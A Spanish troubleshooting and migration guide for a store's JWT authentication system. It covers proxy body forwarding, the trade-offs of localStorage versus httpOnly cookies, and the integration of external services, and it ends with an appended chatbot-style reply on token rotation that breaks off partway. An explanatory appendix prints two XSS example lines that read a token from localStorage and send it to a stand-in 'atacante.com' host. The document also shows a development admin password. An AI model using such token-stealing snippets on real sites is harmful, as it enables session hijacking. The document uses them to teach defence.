# Troubleshooting - Sistema de Autenticación

**Fecha de documentación**: 29 de Octubre de 2025

Esta documentación detalla los problemas encontrados durante la implementación del sistema de autenticación y sus soluciones, para referencia futura.

## Arquitectura del Sistema de Autenticación

**Flujo de autenticación**:
1. Frontend (`localhost:3011`) → API Gateway (`localhost:3000`) → User Service (`localhost:3003`)
2. El API Gateway valida el token JWT y agrega headers `X-User-ID`, `X-User-Role`
3. Los microservicios reciben estos headers para identificar al usuario

**Componentes clave**:
- **Frontend**: Guarda `access_token` en `localStorage`
- **API Gateway**: Middleware de autenticación que valida tokens
- **User Service**: Genera tokens JWT y maneja sesiones
- **PostgreSQL**: Almacena usuarios y refresh tokens

## Problemas Comunes y Soluciones

### Problema 1: Password Hash Corrupto en PostgreSQL

**Síntoma**:
```
Error: data and hash arguments required
```

**Causa**:
- El password_hash en PostgreSQL estaba truncado o corrupto
- PowerShell interpretaba los caracteres `$` como variables de entorno
- El hash bcrypt debe tener exactamente 60 caracteres

**Solución**:
```bash
# Generar hash correcto desde Node.js
docker exec technovastore-user-service node -e "const bcrypt = require('bcrypt'); bcrypt.hash('Admin123!', 12).then(hash => console.log(hash));"

# Crear archivo SQL temporal para evitar problemas con $
# temp_update_password.sql:
UPDATE users 
SET password_hash = '$2b$12$HbAfGteMB14DU4aRK2v4RO5lVCf59d.agOigYQOMBgNd0yCKgHSdu' 
WHERE email = 'admin@technovastore.com';

# Ejecutar desde archivo
docker cp temp_update_password.sql technovastore-postgresql:/tmp/update_password.sql
docker exec technovastore-postgresql psql -U admin -d technovastore -f /tmp/update_password.sql

# Verificar longitud (debe ser 60)
docker exec technovastore-postgresql psql -U admin -d technovastore -c "SELECT LENGTH(password_hash) FROM users WHERE email = 'admin@technovastore.com';"
```

**Prevención**:
- Siempre usar archivos SQL para actualizar passwords
- Verificar que el hash tenga 60 caracteres
- NO usar comandos inline con PowerShell para passwords

### Problema 2: API Gateway No Reenviaba el Body

**Síntoma**:
- Login timeout de 30 segundos
- User Service recibía error: `request aborted`
- El body de la petición llegaba vacío

**Causa**:
- El API Gateway usa `express.json()` para parsear el body
- `http-proxy-middleware` no reenvía automáticamente el body parseado
- El User Service esperaba recibir el body pero llegaba vacío

**Solución**:

Agregar `onProxyReq` en las rutas de autenticación del API Gateway:

```typescript
// api-gateway/src/routes/index.ts
app.use('/api/auth/login', authSecurity, createProxyMiddleware({
  target: services.user,
  changeOrigin: true,
  timeout: 30000,
  proxyTimeout: 30000,
  pathRewrite: {
    '^/api/auth/login': '/auth/login',
  },
  onProxyReq: (proxyReq: any, req: any) => {
    // Fix body forwarding when using body-parser
    if (req.body && Object.keys(req.body).length > 0) {
      const bodyData = JSON.stringify(req.body);
      proxyReq.setHeader('Content-Type', 'application/json');
      proxyReq.setHeader('Content-Length', Buffer.byteLength(bodyData));
      proxyReq.write(bodyData);
    }
  },
  onError: (err: any, _req: any, res: any) => {
    logger.error('Auth login service proxy error:', err);
    res.status(503).json({ error: 'Authentication service unavailable' });
  },
  onProxyRes: ensureCorsHeaders,
}));
```

**Aplicar a todas las rutas que usan POST/PUT**:
- `/api/auth/login`
- `/api/auth/register`
- `/api/auth/reset-password`

### Problema 3: Token No Se Guardaba en localStorage

**Síntoma**:
- Login exitoso pero navegación redirigía al login
- Token no persistía entre páginas

**Causa**:
- El backend devuelve `tokens.accessToken` pero el frontend buscaba `access_token`
- Estructura de respuesta inconsistente

**Solución**:

```typescript
// frontend/src/services/auth.service.ts
async login(credentials: LoginCredentials): Promise<User> {
  const response = await authAxios.post<{ success: boolean; message: string; data: AuthResponse }>(
    AUTH_ENDPOINTS.login,
    credentials
  );

  // Guardar el access token en localStorage
  const accessToken = response.data.data.tokens?.accessToken || response.data.data.token;
  if (accessToken && typeof window !== 'undefined') {
    localStorage.setItem('auth_token', accessToken);
    console.log('✅ Access token saved to localStorage');
  }

  return response.data.data.user;
}
```

**Actualizar tipos TypeScript**:

```typescript
// frontend/src/types/auth.types.ts
export interface AuthResponse {
  success: boolean;
  message: string;
  user: User;
  tokens?: {
    accessToken: string;
    refreshToken?: string;
  };
  // Retrocompatibilidad
  token?: string;
  refreshToken?: string;
}
```

### Problema 4: Endpoint /auth/me Sin Middleware de Autenticación

**Síntoma**:
- `GET /api/auth/me` devolvía 401 Unauthorized
- Frontend no podía verificar sesión del usuario
- Navegación entre dashboards fallaba

**Causa**:
- La ruta general `/api/auth` en el API Gateway usaba `publicSecurity`
- El endpoint `/auth/me` requiere autenticación pero no tenía el middleware
- El User Service espera el header `X-User-ID` que solo agrega el middleware de autenticación

**Solución**:

Agregar ruta específica ANTES de la ruta general:

```typescript
// api-gateway/src/routes/index.ts

// Protected auth endpoint - /me requires authentication
app.use('/api/auth/me', authMiddleware, createProxyMiddleware({
  target: services.user,
  changeOrigin: true,
  pathRewrite: {
    '^/api/auth/me': '/auth/me',
  },
  onError: (err: any, _req: any, res: any) => {
    logger.error('Auth me service proxy error:', err);
    res.status(503).json({ error: 'Authentication service unavailable' });
  },
  onProxyReq: (proxyReq: any, req: any) => {
    if (req.user) {
      proxyReq.setHeader('X-User-ID', req.user.id);
      proxyReq.setHeader('X-User-Role', req.user.role);
    }
  },
  onProxyRes: ensureCorsHeaders,
}));

// General auth endpoints (public for other auth operations)
app.use('/api/auth', publicSecurity, createProxyMiddleware({
  // ... configuración general
}));
```

**Importante**: El orden importa - la ruta específica debe ir ANTES de la general.

### Problema 5: Estructura de Respuesta Inconsistente

**Síntoma**:
- `getCurrentUser()` devolvía `undefined`
- React Query error: "Query data cannot be undefined"

**Causa**:
- Backend devuelve: `{ success: true, data: user }`
- Frontend esperaba: `{ user: User }`

**Solución**:

```typescript
// frontend/src/services/auth.service.ts
async getCurrentUser(): Promise<User | null> {
  try {
    const response = await authAxios.get<{ success: boolean; data: User }>(AUTH_ENDPOINTS.me);
    return response.data.data || null;  // ← Acceder a .data.data
  } catch (error) {
    const authError = handleAuthError(error);
    // Siempre retornar null, nunca undefined
    if (authError.code === 'unauthorized') {
      return null;
    }
    return null;  // ← Importante: retornar null, no throw
  }
}
```

### Problema 6: Tipo User Sin Propiedad 'role'

**Síntoma**:
- Error TypeScript: "La propiedad 'role' no existe en el tipo 'User'"
- Código `user.role === 'admin'` fallaba

**Causa**:
- El tipo `User` en `frontend/src/types/index.ts` no incluía la propiedad `role`

**Solución**:

```typescript
// frontend/src/types/index.ts
export interface User {
  id: number
  email: string
  first_name: string
  last_name: string
  phone?: string
  address?: Address
  role: 'customer' | 'admin'  // ← Agregar esta línea
  is_active: boolean
  created_at: string
  updated_at: string
}
```

### Problema 7: Redirección Basada en Rol

**Síntoma**:
- Usuarios admin eran redirigidos al dashboard de usuario
- No había forma de volver al dashboard de admin

**Causa**:
- La redirección después del login estaba hardcodeada a `/dashboard`
- No verificaba el rol del usuario

**Solución**:

```typescript
// frontend/src/app/login/page.tsx

// Actualizar estado global
setUser(user);
queryClient.setQueryData(queryKeys.auth.user, user);

// Redirigir según el rol del usuario
if (user.role === 'admin') {
  router.push('/admin');
} else {
  router.push('/dashboard');
}
```

**Agregar botón de navegación para admins**:

```typescript
// frontend/src/components/dashboard/UserDashboard.tsx
{user.role === 'admin' && (
  <div className="mt-4 pt-4 border-t border-gray-200">
    <a
      href="/admin"
      className="flex items-center justify-center gap-2 w-full px-4 py-3 bg-gradient-to-r from-purple-600 to-indigo-600 text-white rounded-lg hover:from-purple-700 hover:to-indigo-700 transition-all duration-200 shadow-md hover:shadow-lg font-medium"
    >
      <svg className="w-5 h-5" /* ... icono ... */>
      <span>Dashboard de Admin</span>
    </a>
  </div>
)}
```

## Checklist de Verificación de Autenticación

Cuando el sistema de autenticación falle, verificar en este orden:

1. **Password hash en PostgreSQL**:
   ```bash
   docker exec technovastore-postgresql psql -U admin -d technovastore -c "SELECT LENGTH(password_hash) FROM users WHERE email = 'admin@technovastore.com';"
   # Debe retornar: 60
   ```

2. **Token se guarda en localStorage**:
   - Abrir DevTools → Application → Local Storage
   - Verificar que existe `auth_token`
   - El token debe empezar con `eyJ...`

3. **Token se envía en peticiones**:
   - Abrir DevTools → Network
   - Hacer una petición autenticada
   - Verificar header: `Authorization: Bearer eyJ...`

4. **API Gateway valida el token**:
   ```bash
   # Probar endpoint /auth/me
   docker logs technovastore-api-gateway --tail 20
   # No debe haber errores 401 en /auth/me
   ```

5. **Rutas del API Gateway**:
   - Verificar que `/api/auth/me` tiene `authMiddleware`
   - Verificar que está ANTES de la ruta general `/api/auth`

6. **Tipos TypeScript**:
   - Verificar que `User` tiene propiedad `role`
   - Verificar que `AuthResponse` tiene `tokens.accessToken`

## Comandos Útiles para Debug de Autenticación

```bash
# Ver logs del API Gateway
docker logs technovastore-api-gateway --tail 50 -f

# Ver logs del User Service
docker logs technovastore-user-service --tail 50 -f

# Probar login manualmente
$sessionId = "test_$(Get-Date -Format 'yyyyMMddHHmmss')"
$csrf = (Invoke-RestMethod -Uri "http://localhost:3000/api/csrf-token" -Headers @{"X-Session-ID"=$sessionId}).csrfToken
$body = @{email="admin@technovastore.com";password="Admin123!"} | ConvertTo-Json
$response = Invoke-RestMethod -Uri "http://localhost:3000/api/auth/login" -Method Post -Body $body -ContentType "application/json" -Headers @{"X-CSRF-Token"=$csrf;"X-Session-ID"=$sessionId}
$response | ConvertTo-Json -Depth 3

# Probar endpoint /auth/me con token
$token = $response.data.tokens.accessToken
Invoke-RestMethod -Uri "http://localhost:3000/api/auth/me" -Headers @{"Authorization"="Bearer $token"}

# Verificar password hash
docker exec technovastore-postgresql psql -U admin -d technovastore -c "SELECT id, email, LEFT(password_hash, 10) as hash_start, RIGHT(password_hash, 10) as hash_end, LENGTH(password_hash) as hash_length FROM users WHERE email = 'admin@technovastore.com';"
```

## Estado Actual del Sistema (29 Oct 2025)

✅ **Funcionando correctamente**:
- Login con email y contraseña
- Redirección basada en rol (admin → `/admin`, customer → `/dashboard`)
- Navegación entre dashboard de usuario y admin
- Token persistente en localStorage
- Validación de sesión con `/auth/me`
- Botón "Dashboard de Admin" visible solo para admins

⚠️ **Errores esperados (no críticos)**:
- ChatWidget: `POST /api/chat/session net::ERR_EMPTY_RESPONSE` - El servicio de chatbot no está configurado
- Notificaciones: `GET /api/notifications 404` - Endpoint no implementado todavía

❌ **Pendiente de implementar**:
- OAuth 2.0 (Google, GitHub)
- Cambio de contraseña
- Gestión de métodos de autenticación
- Refresh token automático
- **Migración a httpOnly cookies** (actualmente usa localStorage - ver Notas Importantes)

## Notas Importantes

1. **⚠️ DISCREPANCIA CONOCIDA - Almacenamiento de Tokens**:
   - **Especificación (tasks.md)**: "Usar httpOnly cookies para tokens (NO localStorage)"
   - **Implementación actual**: Usa `localStorage` para almacenar `auth_token`
   - **Razón**: Implementación rápida para MVP funcional
   - **Riesgo de seguridad**: Los tokens en localStorage son vulnerables a ataques XSS
   - **TODO**: Migrar a httpOnly cookies en una futura iteración
   - **Impacto**: Si se migra a cookies, habrá que:
     - Modificar el backend para enviar tokens en cookies con flag httpOnly
     - Configurar Axios con `withCredentials: true`
     - Eliminar todo el código de localStorage del frontend
     - Actualizar el middleware de autenticación del API Gateway

2. **Orden de middlewares en API Gateway**:
   - Body parsing DEBE ir antes de CSRF
   - Rutas específicas DEBEN ir antes de rutas generales
   - `authMiddleware` DEBE agregarse a rutas protegidas

3. **Estructura de respuestas del backend**:
   - Siempre usar: `{ success: boolean, data: T }`
   - El frontend accede con: `response.data.data`

4. **Manejo de errores**:
   - Siempre retornar `null`, nunca `undefined`
   - React Query no acepta `undefined` como valor de query

5. **Reconstrucción de servicios**:
   - Después de cambios en el código, SIEMPRE reconstruir:
   ```bash
   docker-compose -f docker-compose.optimized.yml up -d --build <service-name>
   ```

6. **Frontend en desarrollo**:
   - El frontend usa Hot Module Replacement (HMR)
   - Los cambios se aplican automáticamente SIN reconstruir
   - Solo reconstruir si hay cambios en dependencias o configuración

## Arquitectura de Archivos Relacionados

```
frontend/
├── src/
│   ├── app/
│   │   ├── login/page.tsx              # Página de login con redirección por rol
│   │   ├── admin/                      # Dashboard de administración
│   │   └── dashboard/                  # Dashboard de usuario
│   ├── components/
│   │   ├── auth/
│   │   │   └── ProtectedRoute.tsx      # Componente de protección de rutas
│   │   └── dashboard/
│   │       └── UserDashboard.tsx       # Dashboard con botón admin
│   ├── hooks/
│   │   ├── useAuth.ts                  # Hook de autenticación con React Query
│   │   └── useUser.ts                  # Hook para datos del usuario
│   ├── services/
│   │   └── auth.service.ts             # Servicio de autenticación
│   ├── types/
│   │   ├── index.ts                    # Tipos generales (User con role)
│   │   └── auth.types.ts               # Tipos de autenticación (AuthResponse)
│   └── lib/
│       └── api.ts                      # Configuración de Axios con interceptores

api-gateway/
├── src/
│   ├── routes/
│   │   └── index.ts                    # Configuración de rutas con middlewares
│   ├── middleware/
│   │   ├── auth.ts                     # Middleware de autenticación JWT
│   │   └── security.ts                 # Middlewares de seguridad (CSRF, etc.)
│   └── config/
│       └── security.ts                 # Configuración de seguridad

services/user/
├── src/
│   ├── controllers/
│   │   └── authController.ts           # Controlador de autenticación
│   ├── models/
│   │   └── User.ts                     # Modelo de usuario con validatePassword
│   ├── routes/
│   │   ├── authRoutes.ts               # Rutas de autenticación (/auth/*)
│   │   └── userRoutes.ts               # Rutas de usuario (/users/*)
│   └── services/
│       └── authService.ts              # Lógica de negocio de autenticación
```

## Contacto y Soporte

Para problemas relacionados con autenticación:
1. Consultar este documento primero
2. Verificar el checklist de verificación
3. Ejecutar los comandos de debug
4. Si el problema persiste, documentar el error específico y los pasos para reproducirlo


---

## Apéndice: localStorage vs httpOnly Cookies

### ¿Por qué httpOnly Cookies son Más Seguras?

**Problema con localStorage**: Es accesible desde JavaScript, lo que lo hace vulnerable a ataques XSS (Cross-Site Scripting).

#### Escenario de Ataque XSS

```javascript
// Si un atacante logra inyectar este código en tu sitio:
const token = localStorage.getItem('auth_token');
fetch('https://atacante.com/robar', {
  method: 'POST',
  body: JSON.stringify({ token })
});
```

#### ¿Cómo puede inyectarse código malicioso?

1. **Comentarios/reviews sin sanitizar**:
   ```html
   <script>
     fetch('https://atacante.com/steal?token=' + localStorage.getItem('auth_token'))
   </script>
   ```

2. **Dependencias npm comprometidas**: Un paquete que instalas contiene código malicioso

3. **Extensiones de navegador maliciosas**: Pueden leer localStorage de cualquier sitio

4. **Librerías de terceros hackeadas**: Analytics, ads, widgets comprometidos

#### Protección de httpOnly Cookies

```javascript
// Con httpOnly cookies, este código NO funciona:
document.cookie // No puede leer cookies con flag httpOnly
localStorage.getItem('auth_token') // No existe el token aquí
```

**Ventajas de httpOnly cookies**:
- ✅ Solo el navegador puede leerlas
- ✅ Se envían automáticamente en cada request
- ✅ JavaScript NO puede acceder a ellas
- ✅ Protegidas contra XSS
- ✅ Expiran automáticamente
- ✅ Funcionan en subdominios

**Configuración segura**:
```typescript
// Backend - authController.ts
res.cookie('auth_token', accessToken, {
  httpOnly: true,      // JavaScript no puede leerla
  secure: true,        // Solo HTTPS en producción
  sameSite: 'strict',  // Protección contra CSRF
  maxAge: 15 * 60 * 1000, // 15 minutos
  domain: '.technovastore.com' // Funciona en subdominios
});
```

### Comparación Completa

| Aspecto | localStorage | httpOnly Cookies |
|---------|-------------|------------------|
| **Accesible desde JS** | ✅ Sí | ❌ No |
| **Vulnerable a XSS** | ⚠️ Sí | ✅ No |
| **Vulnerable a CSRF** | ✅ No | ⚠️ Sí (mitigable con sameSite) |
| **Funciona en subdominios** | ❌ No | ✅ Sí (con domain flag) |
| **Expira automáticamente** | ❌ No | ✅ Sí |
| **Se envía automáticamente** | ❌ No | ✅ Sí |
| **Debugging** | ✅ Fácil (DevTools) | ⚠️ Más difícil |
| **Control explícito** | ✅ Sí | ❌ No |
| **Tamaño máximo** | ~5-10 MB | ~4 KB |

### ¿Por qué TechNovaStore Usa localStorage Actualmente?

**Razones válidas para MVP/desarrollo**:
1. ✅ Simplicidad de implementación
2. ✅ Debugging más fácil (ver token en DevTools)
3. ✅ No requiere configurar CORS con credentials
4. ✅ Control explícito de cuándo enviar el token
5. ✅ Riesgo bajo sin contenido de usuarios sin sanitizar

**Cuándo migrar a httpOnly cookies**:
- ⚠️ Cuando haya reviews/comentarios de usuarios
- ⚠️ Cuando se integren librerías de terceros (analytics, ads)
- ⚠️ Antes de lanzar a producción
- ⚠️ Cuando el riesgo de XSS aumente

---

## Arquitectura de Autenticación con Servicios Externos

### Pregunta Común: ¿Qué pasa con APIs de terceros que no aceptan cookies?

**Respuesta**: No es un problema porque el frontend **nunca debe llamar directamente** a servicios externos.

### ❌ Arquitectura Incorrecta (Insegura)

```
Frontend → API de Terceros (Stripe, PayPal, Cloudinary)
          ↑ Expone API keys en el cliente
          ↑ No puede enviar httpOnly cookies
```

### ✅ Arquitectura Correcta (Segura)

```
Frontend (localhost:3011)
    ↓ httpOnly cookies
API Gateway (localhost:3000)
    ↓ valida token JWT
    ↓ agrega headers X-User-ID, X-User-Role
Microservicios (localhost:3001-3012)
    ↓ usan API keys/secrets (seguros en backend)
Servicios Externos (Stripe, PayPal, Cloudinary, etc.)
```

### Ejemplos Prácticos en TechNovaStore

#### 1. Procesamiento de Pagos (Stripe)

```typescript
// ❌ MAL - Frontend llama directamente a Stripe
const paymentIntent = await stripe.paymentIntents.create({
  amount: 1000,
  currency: 'usd'
});
// Problema: Expone API secret key en el cliente

// ✅ BIEN - Frontend llama a tu backend
const response = await fetch('http://localhost:3000/api/payments/create-intent', {
  method: 'POST',
  credentials: 'include', // ← Envía httpOnly cookies automáticamente
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({ amount: 1000 })
});

// Backend (Payment Service) llama a Stripe
// backend-services/payment/src/controllers/paymentController.ts
const paymentIntent = await stripe.paymentIntents.create({
  amount: req.body.amount,
  currency: 'usd',
  customer: req.user.id, // ← Obtenido del token validado por API Gateway
  metadata: {
    userId: req.user.id,
    orderId: req.body.orderId
  }
});
```

#### 2. Subir Imágenes (Cloudinary)

```typescript
// ❌ MAL - Frontend sube directamente
const formData = new FormData();
formData.append('file', file);
await fetch('https://api.cloudinary.com/v1_1/upload', {
  method: 'POST',
  body: formData
});
// Problema: Expone API key de Cloudinary

// ✅ BIEN - Frontend envía a tu backend
const formData = new FormData();
formData.append('file', file);
await fetch('http://localhost:3000/api/uploads/avatar', {
  method: 'POST',
  credentials: 'include', // ← httpOnly cookie
  body: formData
});

// Backend sube a Cloudinary con tu API key (segura)
// domains/customer/user-service/src/controllers/uploadController.ts
const result = await cloudinary.uploader.upload(file.path, {
  folder: `users/${req.user.id}/avatars`,
  public_id: `avatar_${Date.now()}`,
  overwrite: true
});
```

#### 3. Envío de Notificaciones (SendGrid/Twilio)

```typescript
// ❌ MAL - Frontend llama directamente
await sendgrid.send({
  to: 'user@example.com',
  from: 'noreply@technovastore.com',
  subject: 'Pedido confirmado',
  html: '<p>Tu pedido ha sido confirmado</p>'
});
// Problema: Expone API key de SendGrid

// ✅ BIEN - Backend maneja notificaciones automáticamente
// El Notification Service escucha eventos de Redis y envía emails
// El frontend no necesita hacer nada
```

#### 4. Chatbot (Ollama)

```typescript
// ✅ BIEN - Socket.IO con credentials
const socket = io('http://localhost:3009', {
  withCredentials: true, // ← Envía httpOnly cookies
  transports: ['websocket']
});

socket.emit('chat_message_stream', {
  message: 'Recomiéndame una laptop',
  sessionId: currentSessionId
});

// Chatbot Service procesa con Ollama (servicio local, no externo)
```

### Única Excepción: SDKs de Cliente

Algunos servicios **requieren** ejecutarse en el cliente por razones de seguridad (PCI DSS):

#### Stripe Elements (Tokenización de Tarjetas)

```typescript
// Esto SÍ se ejecuta en el frontend
import { loadStripe } from '@stripe/stripe-js';

const stripe = await loadStripe('pk_test_...'); // ← API key PÚBLICA
const elements = stripe.elements();
const cardElement = elements.create('card');

// Usuario ingresa datos de tarjeta
// Stripe genera un token temporal (NO procesa el pago)
const { token } = await stripe.createToken(cardElement);

// El token se envía a tu backend con httpOnly cookie
const response = await fetch('/api/payments/process', {
  method: 'POST',
  credentials: 'include', // ← httpOnly cookie para autenticación
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    stripeToken: token.id, // ← Token temporal de Stripe
    amount: 1000,
    orderId: '12345'
  })
});

// Backend procesa el pago con la API key SECRETA
// backend-services/payment/src/controllers/paymentController.ts
const charge = await stripe.charges.create({
  amount: req.body.amount,
  currency: 'usd',
  source: req.body.stripeToken, // ← Token del frontend
  customer: req.user.id, // ← Usuario autenticado
  description: `Order ${req.body.orderId}`
});
```

**Por qué funciona**:
- El SDK de Stripe usa su propia API key **pública** (`pk_test_...`)
- Solo genera tokens temporales de un solo uso
- **NO procesa pagos** (eso lo hace el backend con la key secreta)
- Cumple con PCI DSS (datos de tarjeta nunca tocan tu servidor)

### Tabla de Servicios en TechNovaStore

| Servicio | ¿Dónde se llama? | ¿Necesita httpOnly cookie? | ¿Expone credenciales? |
|----------|------------------|---------------------------|----------------------|
| **Stripe Payment** | Backend | ❌ No | ❌ No (API secret segura) |
| **Stripe Elements** | Frontend | ❌ No | ✅ Sí (API pública, seguro) |
| **PayPal** | Backend | ❌ No | ❌ No (API secret segura) |
| **Cloudinary** | Backend | ❌ No | ❌ No (API key segura) |
| **SendGrid** | Backend | ❌ No | ❌ No (API key segura) |
| **Twilio** | Backend | ❌ No | ❌ No (API key segura) |
| **Tu API Gateway** | Frontend | ✅ Sí | ❌ No (token en cookie) |
| **Ollama** | Backend | ❌ No | ❌ No (servicio local) |
| **MongoDB** | Backend | ❌ No | ❌ No (credenciales internas) |
| **PostgreSQL** | Backend | ❌ No | ❌ No (credenciales internas) |
| **Redis** | Backend | ❌ No | ❌ No (credenciales internas) |

### Conclusión

**No hay problema con migrar a httpOnly cookies** porque:

1. ✅ Tu arquitectura de microservicios ya está diseñada correctamente
2. ✅ El frontend solo habla con tu API Gateway (que acepta cookies)
3. ✅ Los microservicios hablan con servicios externos usando API keys seguras
4. ✅ Los SDKs de cliente (Stripe Elements) usan sus propias credenciales públicas
5. ✅ Nunca expones API secrets en el cliente

---

## Guía de Migración a httpOnly Cookies

Cuando decidas migrar de localStorage a httpOnly cookies, sigue estos pasos:

### Paso 1: Actualizar Backend (User Service)

```typescript
// domains/customer/user-service/src/controllers/authController.ts

export const login = async (req: Request, res: Response) => {
  // ... validación y autenticación ...

  const { accessToken, refreshToken } = generateTokens(user);

  // ✅ Enviar tokens en cookies
  res.cookie('access_token', accessToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production', // Solo HTTPS en prod
    sameSite: 'strict',
    maxAge: 15 * 60 * 1000, // 15 minutos
    path: '/'
  });

  res.cookie('refresh_token', refreshToken, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 días
    path: '/api/auth/refresh' // Solo accesible en endpoint de refresh
  });

  // ❌ NO enviar tokens en el body
  res.json({
    success: true,
    message: 'Login exitoso',
    data: {
      user: {
        id: user.id,
        email: user.email,
        first_name: user.first_name,
        last_name: user.last_name,
        role: user.role
      }
      // ❌ NO incluir: tokens: { accessToken, refreshToken }
    }
  });
};

export const logout = async (req: Request, res: Response) => {
  // Limpiar cookies
  res.clearCookie('access_token');
  res.clearCookie('refresh_token');

  res.json({
    success: true,
    message: 'Logout exitoso'
  });
};
```

### Paso 2: Actualizar API Gateway

```typescript
// api-gateway/src/middleware/auth.ts

export const authMiddleware = async (req: Request, res: Response, next: NextFunction) => {
  try {
    // ✅ Leer token de cookie en lugar de header
    const token = req.cookies.access_token;

    if (!token) {
      return res.status(401).json({ error: 'No autenticado' });
    }

    // Validar token
    const decoded = jwt.verify(token, process.env.JWT_SECRET!) as JWTPayload;

    // Agregar usuario a request
    req.user = {
      id: decoded.userId,
      email: decoded.email,
      role: decoded.role
    };

    next();
  } catch (error) {
    return res.status(401).json({ error: 'Token inválido' });
  }
};
```

```typescript
// api-gateway/src/index.ts

import cookieParser from 'cookie-parser';

const app = express();

// ✅ Agregar cookie parser
app.use(cookieParser());

// ✅ Configurar CORS para aceptar credentials
app.use(cors({
  origin: 'http://localhost:3011', // Frontend URL
  credentials: true, // ← Importante: permite enviar cookies
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH'],
  allowedHeaders: ['Content-Type', 'X-CSRF-Token', 'X-Session-ID']
}));
```

### Paso 3: Actualizar Frontend

```typescript
// frontend/src/lib/api.ts

import axios from 'axios';

export const authAxios = axios.create({
  baseURL: process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3000',
  withCredentials: true, // ← Importante: envía cookies automáticamente
  headers: {
    'Content-Type': 'application/json',
  },
});

// ❌ Eliminar interceptor que agrega Authorization header
// authAxios.interceptors.request.use((config) => {
//   const token = localStorage.getItem('auth_token');
//   if (token) {
//     config.headers.Authorization = `Bearer ${token}`;
//   }
//   return config;
// });
```

```typescript
// frontend/src/services/auth.service.ts

class AuthService {
  async login(credentials: LoginCredentials): Promise<User> {
    const response = await authAxios.post<{ success: boolean; message: string; data: { user: User } }>(
      AUTH_ENDPOINTS.login,
      credentials
    );

    // ❌ NO guardar token en localStorage
    // localStorage.setItem('auth_token', accessToken);

    // ✅ El token ya está en httpOnly cookie
    return response.data.data.user;
  }

  async logout(): Promise<void> {
    await authAxios.post(AUTH_ENDPOINTS.logout);

    // ❌ NO limpiar localStorage
    // localStorage.removeItem('auth_token');

    // ✅ El backend ya limpió las cookies
  }

  async getCurrentUser(): Promise<User | null> {
    try {
      const response = await authAxios.get<{ success: boolean; data: User }>(AUTH_ENDPOINTS.me);
      return response.data.data;
    } catch (error) {
      return null;
    }
  }
}
```

### Paso 4: Actualizar Variables de Entorno

```bash
# .env.local (Frontend)
NEXT_PUBLIC_API_URL=http://localhost:3000

# .env (API Gateway)
FRONTEND_URL=http://localhost:3011
NODE_ENV=development

# .env (User Service)
JWT_SECRET=tu_secret_super_seguro
JWT_EXPIRES_IN=15m
REFRESH_TOKEN_EXPIRES_IN=7d
```

### Paso 5: Probar la Migración

```bash
# 1. Limpiar localStorage
# Abrir DevTools → Application → Local Storage → Clear All

# 2. Hacer login
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@technovastore.com","password":"Admin123!"}' \
  -c cookies.txt

# 3. Verificar cookies
cat cookies.txt
# Debe mostrar: access_token y refresh_token con flag HttpOnly

# 4. Probar endpoint autenticado
curl -X GET http://localhost:3000/api/auth/me \
  -b cookies.txt

# 5. Verificar en navegador
# DevTools → Application → Cookies → localhost:3000
# Debe mostrar: access_token (HttpOnly ✓, Secure ✓, SameSite: Strict)
```

### Checklist de Migración

- [ ] Backend envía tokens en cookies con flags httpOnly, secure, sameSite
- [ ] Backend NO envía tokens en el body de la respuesta
- [ ] API Gateway lee tokens de cookies en lugar de headers
- [ ] API Gateway tiene CORS configurado con credentials: true
- [ ] Frontend usa withCredentials: true en Axios
- [ ] Frontend NO guarda tokens en localStorage
- [ ] Frontend NO agrega header Authorization manualmente
- [ ] Todas las llamadas fetch/axios usan credentials: 'include'
- [ ] Variables de entorno actualizadas
- [ ] Tests actualizados para usar cookies
- [ ] Documentación actualizada

### Rollback Plan

Si algo falla durante la migración:

1. Revertir cambios en el backend (volver a enviar tokens en body)
2. Revertir cambios en el frontend (volver a usar localStorage)
3. Investigar el problema específico
4. Probar en ambiente de desarrollo antes de producción

---

## Referencias y Recursos

- [OWASP - XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP - Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN - HTTP Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
- [Stripe - PCI Compliance](https://stripe.com/docs/security/guide)
- [JWT Best Practices](https://tools.ietf.org/html/rfc8725)












Excelente pregunta. httpOnly cookies son muy seguras, pero hay mejoras adicionales y alternativas modernas que puedes implementar. Te explico:

🔒 Mejoras sobre httpOnly Cookies Básicas
1. httpOnly + Secure + SameSite (Configuración Óptima)
res.cookie('access_token', token, {
  httpOnly: true,        // ✅ Protege contra XSS
  secure: true,          // ✅ Solo HTTPS (protege contra man-in-the-middle)
  sameSite: 'strict',    // ✅ Protege contra CSRF
  domain: '.technovastore.com', // ✅ Funciona en subdominios
  path: '/',             // ✅ Disponible en toda la app
  maxAge: 15 * 60 * 1000 // ✅ Expira automáticamente
});
2. Token Rotation (Refresh Token Rotation)
Cada vez que usas un refresh token, se genera uno nuevo y el anterior se invalida:

// Backend - authController.ts
export const refreshToken = async (req: Request, res: Response) => {
  const oldRefreshToken = req.cookies.refresh_token;
  
  // Validar token viejo
  const decoded = jwt.verify(oldRefreshToken, process.env.JWT_REFRESH_SECRET!);
  
  // ✅ Generar NUEVOS tokens
  const { accessToken, refreshToken: newRefreshToken } = generateTokens(user);
  
  // ✅ Invalidar token viejo en base de datos
  await RefreshToken.update(
    { is_revoked: true },
    { where: { token: oldRefreshToken } }
  );
  
  // ✅ Guardar nuevo token
  await RefreshToken.create({
    user_id: user.id,
    token: newRefreshToken,
    expires_at: new Date(Date.now() + 7 * 24 * 60 * 60 * 1000)
  });
  
  // Enviar nuevos tokens
  res.cookie('access_token', accessToken, { /* ... */ });
  res.cookie('refresh_token', newRefreshToken, { /* ... */ });
  
  res.json({ success: true });
};
Ventaja: Si un atacante roba un refresh token, solo puede usarlo una vez.

3. Token Fingerprinting (Device Binding)
Vincular el token a características del dispositivo:

// Backend - generateTokens
import crypto from 'crypto';

const generateFingerprint = (req: Request): string => {
  const data = `${req.ip}|${req.headers['user-agent']}`;
